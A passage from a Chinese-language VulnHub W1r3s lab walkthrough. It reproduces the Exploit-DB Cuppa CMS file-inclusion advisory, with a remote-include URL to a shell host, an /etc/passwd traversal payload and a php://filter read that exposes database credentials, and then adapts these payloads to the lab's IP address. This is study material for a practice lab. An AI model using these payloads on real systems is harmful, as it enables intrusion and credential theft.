+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;└─$ searchsploit cuppa 
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;-------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; Exploit Title &lt;span class="p"&gt;|&lt;/span&gt; Path
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;-------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Cuppa CMS - &lt;span class="s1"&gt;&amp;#39;/alertConfigField.php&amp;#39;&lt;/span&gt; Local/Remote File Inclusion &lt;span class="p"&gt;|&lt;/span&gt; php/webapps/25971.txt
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;-------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Shellcodes: No Results
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;读取这个文件&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
+&lt;/span&gt;&lt;span class="lnt"&gt; 2
+&lt;/span&gt;&lt;span class="lnt"&gt; 3
+&lt;/span&gt;&lt;span class="lnt"&gt; 4
+&lt;/span&gt;&lt;span class="lnt"&gt; 5
+&lt;/span&gt;&lt;span class="lnt"&gt; 6
+&lt;/span&gt;&lt;span class="lnt"&gt; 7
+&lt;/span&gt;&lt;span class="lnt"&gt; 8
+&lt;/span&gt;&lt;span class="lnt"&gt; 9
+&lt;/span&gt;&lt;span class="lnt"&gt;10
+&lt;/span&gt;&lt;span class="lnt"&gt;11
+&lt;/span&gt;&lt;span class="lnt"&gt;12
+&lt;/span&gt;&lt;span class="lnt"&gt;13
+&lt;/span&gt;&lt;span class="lnt"&gt;14
+&lt;/span&gt;&lt;span class="lnt"&gt;15
+&lt;/span&gt;&lt;span class="lnt"&gt;16
+&lt;/span&gt;&lt;span class="lnt"&gt;17
+&lt;/span&gt;&lt;span class="lnt"&gt;18
+&lt;/span&gt;&lt;span class="lnt"&gt;19
+&lt;/span&gt;&lt;span class="lnt"&gt;20
+&lt;/span&gt;&lt;span class="lnt"&gt;21
+&lt;/span&gt;&lt;span class="lnt"&gt;22
+&lt;/span&gt;&lt;span class="lnt"&gt;23
+&lt;/span&gt;&lt;span class="lnt"&gt;24
+&lt;/span&gt;&lt;span class="lnt"&gt;25
+&lt;/span&gt;&lt;span class="lnt"&gt;26
+&lt;/span&gt;&lt;span class="lnt"&gt;27
+&lt;/span&gt;&lt;span class="lnt"&gt;28
+&lt;/span&gt;&lt;span class="lnt"&gt;29
+&lt;/span&gt;&lt;span class="lnt"&gt;30
+&lt;/span&gt;&lt;span class="lnt"&gt;31
+&lt;/span&gt;&lt;span class="lnt"&gt;32
+&lt;/span&gt;&lt;span class="lnt"&gt;33
+&lt;/span&gt;&lt;span class="lnt"&gt;34
+&lt;/span&gt;&lt;span class="lnt"&gt;35
+&lt;/span&gt;&lt;span class="lnt"&gt;36
+&lt;/span&gt;&lt;span class="lnt"&gt;37
+&lt;/span&gt;&lt;span class="lnt"&gt;38
+&lt;/span&gt;&lt;span class="lnt"&gt;39
+&lt;/span&gt;&lt;span class="lnt"&gt;40
+&lt;/span&gt;&lt;span class="lnt"&gt;41
+&lt;/span&gt;&lt;span class="lnt"&gt;42
+&lt;/span&gt;&lt;span class="lnt"&gt;43
+&lt;/span&gt;&lt;span class="lnt"&gt;44
+&lt;/span&gt;&lt;span class="lnt"&gt;45
+&lt;/span&gt;&lt;span class="lnt"&gt;46
+&lt;/span&gt;&lt;span class="lnt"&gt;47
+&lt;/span&gt;&lt;span class="lnt"&gt;48
+&lt;/span&gt;&lt;span class="lnt"&gt;49
+&lt;/span&gt;&lt;span class="lnt"&gt;50
+&lt;/span&gt;&lt;span class="lnt"&gt;51
+&lt;/span&gt;&lt;span class="lnt"&gt;52
+&lt;/span&gt;&lt;span class="lnt"&gt;53
+&lt;/span&gt;&lt;span class="lnt"&gt;54
+&lt;/span&gt;&lt;span class="lnt"&gt;55
+&lt;/span&gt;&lt;span class="lnt"&gt;56
+&lt;/span&gt;&lt;span class="lnt"&gt;57
+&lt;/span&gt;&lt;span class="lnt"&gt;58
+&lt;/span&gt;&lt;span class="lnt"&gt;59
+&lt;/span&gt;&lt;span class="lnt"&gt;60
+&lt;/span&gt;&lt;span class="lnt"&gt;61
+&lt;/span&gt;&lt;span class="lnt"&gt;62
+&lt;/span&gt;&lt;span class="lnt"&gt;63
+&lt;/span&gt;&lt;span class="lnt"&gt;64
+&lt;/span&gt;&lt;span class="lnt"&gt;65
+&lt;/span&gt;&lt;span class="lnt"&gt;66
+&lt;/span&gt;&lt;span class="lnt"&gt;67
+&lt;/span&gt;&lt;span class="lnt"&gt;68
+&lt;/span&gt;&lt;span class="lnt"&gt;69
+&lt;/span&gt;&lt;span class="lnt"&gt;70
+&lt;/span&gt;&lt;span class="lnt"&gt;71
+&lt;/span&gt;&lt;span class="lnt"&gt;72
+&lt;/span&gt;&lt;span class="lnt"&gt;73
+&lt;/span&gt;&lt;span class="lnt"&gt;74
+&lt;/span&gt;&lt;span class="lnt"&gt;75
+&lt;/span&gt;&lt;span class="lnt"&gt;76
+&lt;/span&gt;&lt;span class="lnt"&gt;77
+&lt;/span&gt;&lt;span class="lnt"&gt;78
+&lt;/span&gt;&lt;span class="lnt"&gt;79
+&lt;/span&gt;&lt;span class="lnt"&gt;80
+&lt;/span&gt;&lt;span class="lnt"&gt;81
+&lt;/span&gt;&lt;span class="lnt"&gt;82
+&lt;/span&gt;&lt;span class="lnt"&gt;83
+&lt;/span&gt;&lt;span class="lnt"&gt;84
+&lt;/span&gt;&lt;span class="lnt"&gt;85
+&lt;/span&gt;&lt;span class="lnt"&gt;86
+&lt;/span&gt;&lt;span class="lnt"&gt;87
+&lt;/span&gt;&lt;span class="lnt"&gt;88
+&lt;/span&gt;&lt;span class="lnt"&gt;89
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-shell" data-lang="shell"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;┌──&lt;span class="o"&gt;(&lt;/span&gt;kali㉿kali&lt;span class="o"&gt;)&lt;/span&gt;-&lt;span class="o"&gt;[&lt;/span&gt;~/Labs/Vulnhub/W1r3s&lt;span class="o"&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;└─$ cat /usr/share/exploitdb/exploits/php/webapps/25971.txt
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# Exploit Title : Cuppa CMS File Inclusion&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# Date : 4 June 2013&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# Exploit Author : CWH Underground&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# Site : www.2600.in.th&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# Vendor Homepage : http://www.cuppacms.com/&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# Software Link : http://jaist.dl.sourceforge.net/project/cuppacms/cuppa_cms.zip&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# Version : Beta&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# Tested on : Window and Linux&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; ,--^----------,--------,-----,-------^--,
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="o"&gt;||||||||&lt;/span&gt;&lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="sb"&gt;`&lt;/span&gt;--------&lt;span class="s1"&gt;&amp;#39; | O .. CWH Underground Hacking Team ..
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="s1"&gt; `+---------------------------^----------|
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="s1"&gt; `\_,-------, _________________________|
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="s1"&gt; / XXXXXX /`| /
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="s1"&gt; / XXXXXX / `\ /
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="s1"&gt; / XXXXXX /\______(
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="s1"&gt; / XXXXXX /
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="s1"&gt; / XXXXXX /
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="s1"&gt; (________(
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="s1"&gt; `------&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;####################################&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;VULNERABILITY: PHP CODE INJECTION
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;####################################&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;/alerts/alertConfigField.php &lt;span class="o"&gt;(&lt;/span&gt;LINE: 22&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;-----------------------------------------------------------------------------
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;LINE 22:
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &amp;lt;?php include&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$_REQUEST&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;urlConfig&amp;#34;&lt;/span&gt;&lt;span class="o"&gt;])&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; ?&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;-----------------------------------------------------------------------------
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;#####################################################&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;DESCRIPTION
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;#####################################################&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;An attacker might include &lt;span class="nb"&gt;local&lt;/span&gt; or remote PHP files or &lt;span class="nb"&gt;read&lt;/span&gt; non-PHP files with this vulnerability. User tainted data is used when creating the file name that will be included into the current file. PHP code in this file will be evaluated, non-PHP code will be embedded to the output. This vulnerability can lead to full server compromise.
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;http://target/cuppa/alerts/alertConfigField.php?urlConfig&lt;span class="o"&gt;=[&lt;/span&gt;FI&lt;span class="o"&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;#####################################################&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;EXPLOIT
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;#####################################################&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;http://target/cuppa/alerts/alertConfigField.php?urlConfig&lt;span class="o"&gt;=&lt;/span&gt;http://www.shell.com/shell.txt?
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;http://target/cuppa/alerts/alertConfigField.php?urlConfig&lt;span class="o"&gt;=&lt;/span&gt;../../../../../../../../../etc/passwd
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Moreover, We could access Configuration.php &lt;span class="nb"&gt;source&lt;/span&gt; code via PHPStream
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;For Example:
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;-----------------------------------------------------------------------------
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;http://target/cuppa/alerts/alertConfigField.php?urlConfig&lt;span class="o"&gt;=&lt;/span&gt;php://filter/convert.base64-encode/resource&lt;span class="o"&gt;=&lt;/span&gt;../Configuration.php
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;-----------------------------------------------------------------------------
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Base64 Encode Output:
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;-----------------------------------------------------------------------------
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;PD9waHAgCgljbGFzcyBDb25maWd1cmF0aW9uewoJCXB1YmxpYyAkaG9zdCA9ICJsb2NhbGhvc3QiOwoJCXB1YmxpYyAkZGIgPSAiY3VwcGEiOwoJCXB1YmxpYyAkdXNlciA9ICJyb290IjsKCQlwdWJsaWMgJHBhc3N3b3JkID0gIkRiQGRtaW4iOwoJCXB1YmxpYyAkdGFibGVfcHJlZml4ID0gImN1XyI7CgkJcHVibGljICRhZG1pbmlzdHJhdG9yX3RlbXBsYXRlID0gImRlZmF1bHQiOwoJCXB1YmxpYyAkbGlzdF9saW1pdCA9IDI1OwoJCXB1YmxpYyAkdG9rZW4gPSAiT0JxSVBxbEZXZjNYIjsKCQlwdWJsaWMgJGFsbG93ZWRfZXh0ZW5zaW9ucyA9ICIqLmJtcDsgKi5jc3Y7ICouZG9jOyAqLmdpZjsgKi5pY287ICouanBnOyAqLmpwZWc7ICoub2RnOyAqLm9kcDsgKi5vZHM7ICoub2R0OyAqLnBkZjsgKi5wbmc7ICoucHB0OyAqLnN3ZjsgKi50eHQ7ICoueGNmOyAqLnhsczsgKi5kb2N4OyAqLnhsc3giOwoJCXB1YmxpYyAkdXBsb2FkX2RlZmF1bHRfcGF0aCA9ICJtZWRpYS91cGxvYWRzRmlsZXMiOwoJCXB1YmxpYyAkbWF4aW11bV9maWxlX3NpemUgPSAiNTI0Mjg4MCI7CgkJcHVibGljICRzZWN1cmVfbG9naW4gPSAwOwoJCXB1YmxpYyAkc2VjdXJlX2xvZ2luX3ZhbHVlID0gIiI7CgkJcHVibGljICRzZWN1cmVfbG9naW5fcmVkaXJlY3QgPSAiIjsKCX0gCj8+
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;-----------------------------------------------------------------------------
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Base64 Decode Output:
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;-----------------------------------------------------------------------------
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&amp;lt;?php
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; class Configuration&lt;span class="o"&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; public &lt;span class="nv"&gt;$host&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;localhost&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; public &lt;span class="nv"&gt;$db&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;cuppa&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; public &lt;span class="nv"&gt;$user&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;root&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; public &lt;span class="nv"&gt;$password&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;Db@dmin&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; public &lt;span class="nv"&gt;$table_prefix&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;cu_&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; public &lt;span class="nv"&gt;$administrator_template&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;default&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; public &lt;span class="nv"&gt;$list_limit&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; 25&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; public &lt;span class="nv"&gt;$token&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;OBqIPqlFWf3X&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; public &lt;span class="nv"&gt;$allowed_extensions&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;*.bmp; *.csv; *.doc; *.gif; *.ico; *.jpg; *.jpeg; *.odg; *.odp; *.ods; *.odt; *.pdf; *.png; *.ppt; *.swf; *.txt; *.xcf; *.xls; *.docx; *.xlsx&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; public &lt;span class="nv"&gt;$upload_default_path&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;media/uploadsFiles&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; public &lt;span class="nv"&gt;$maximum_file_size&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;5242880&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; public &lt;span class="nv"&gt;$secure_login&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; 0&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; public &lt;span class="nv"&gt;$secure_login_value&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; public &lt;span class="nv"&gt;$secure_login_redirect&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="o"&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;?&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;-----------------------------------------------------------------------------
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Able to &lt;span class="nb"&gt;read&lt;/span&gt; sensitive information via File Inclusion &lt;span class="o"&gt;(&lt;/span&gt;PHP Stream&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;################################################################################################################&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; Greetz : ZeQ3uL, JabAv0C, p3lo, Sh0ck, BAD &lt;span class="nv"&gt;$ectors&lt;/span&gt;, Snapter, Conan, Win7dos, Gdiupo, GnuKDE, JK, Retool2
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;################################################################################################################ &lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;从 Exploit 内容看，关键信息如下：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;漏洞文件：&lt;code&gt;/alerts/alertConfigField.php&lt;/code&gt;，相对于 Cuppa CMS 根目录。&lt;/li&gt;
+&lt;li&gt;结合你之前扫描到的 &lt;code&gt;/administrator/&lt;/code&gt; 目录，完整路径很可能是：&lt;code&gt;http://10.10.10.104/administrator/alerts/alertConfigField.php&lt;/code&gt;。&lt;/li&gt;
+&lt;li&gt;漏洞参数：&lt;code&gt;urlConfig&lt;/code&gt;，通过 &lt;code&gt;include($_REQUEST[&amp;quot;urlConfig&amp;quot;])&lt;/code&gt; 直接包含，可读任意文件或远程文件。&lt;/li&gt;
+&lt;li&gt;利用方式：&lt;code&gt;?urlConfig=../../../../../../../../../etc/passwd&lt;/code&gt; 可读 &lt;code&gt;/etc/passwd&lt;/code&gt;。&lt;/li&gt;
+&lt;li&gt;还可以用 &lt;code&gt;php://filter&lt;/code&gt; 读 &lt;code&gt;Configuration.php&lt;/code&gt; 源码，里面可能包含数据库账号密码。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;按照这个exp 先访问这个url看看存不存在&lt;/p&gt;
+&lt;p&gt;&lt;img class="gallery-image" data-flex-basis="505px" data-flex-grow="210" height="912" loading="lazy" sizes="(max-width: 767px) calc(100vw - 30px), (max-width: 1023px) 700px, (max-width: 1279px) 950px, 1232px" src="https://ke1thli.github.io/p/w1r3s-1.0.1-vulnhub%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/file-20261013233843796.png" srcset="https://ke1thli.github.io/p/w1r3s-1.0.1-vulnhub%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/file-20261013233843796_hu_aace591de00e3d3c.png 800w, https://ke1thli.github.io/p/w1r3s-1.0.1-vulnhub%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/file-20261013233843796_hu_e7e7b043b577e7ed.png 1600w, https://ke1thli.github.io/p/w1r3s-1.0.1-vulnhub%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/file-20261013233843796.png 1919w" width="1919"&gt;&lt;/p&gt;
+&lt;p&gt;存在的，但是为什么是空白的？&lt;/p&gt;
+&lt;p&gt;http://10.10.10.104/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd 也是同样的结果&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;$_REQUEST&lt;/code&gt; 同时存在get和post，接下来试试&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
+&lt;/span&gt;&lt;span class="lnt"&gt; 2
+&lt;/span&gt;&lt;span class="lnt"&gt; 3
+&lt;/span&gt;&lt;span class="lnt"&gt; 4
+&lt;/span&gt;&lt;span class="lnt"&gt; 5
+&lt;/span&gt;&lt;span class="lnt"&gt; 6
+&lt;/span&gt;&lt;span class="lnt"&gt; 7
+&lt;/span&gt;&lt;span class="lnt"&gt; 8
+&lt;/span&gt;&lt;span class="lnt"&gt; 9
+&lt;/span&gt;&lt;span class="lnt"&gt;10
+&lt;/span&gt;&lt;span class="lnt"&gt;11
+&lt;/span&gt;&lt;span class="lnt"&gt;12
+&lt;/span&gt;&lt;span class="lnt"&gt;13
+&lt;/span&gt;&lt;span class="lnt"&gt;14
+&lt;/span&gt;&lt;span class="lnt"&gt;15
+&lt;/span&gt;&lt;span class="lnt"&gt;16
+&lt;/span&gt;&lt;span class="lnt"&gt;17
+&lt;/span&gt;&lt;span class="lnt"&gt;18
+&lt;/span&gt;&lt;span class="lnt"&gt;19
+&lt;/span&gt;&lt;span class="lnt"&gt;20
+&lt;/span&gt;&lt;span class="lnt"&gt;21
+&lt;/span&gt;&lt;span class="lnt"&gt;22
+&lt;/span&gt;&lt;span class="lnt"&gt;23
+&lt;/span&gt;&lt;span class="lnt"&gt;24
+&lt;/span&gt;&lt;span class="lnt"&gt;25
+&lt;/span&gt;&lt;span class="lnt"&gt;26
+&lt;/span&gt;&lt;span class="lnt"&gt;27
+&lt;/span&gt;&lt;span class="lnt"&gt;28
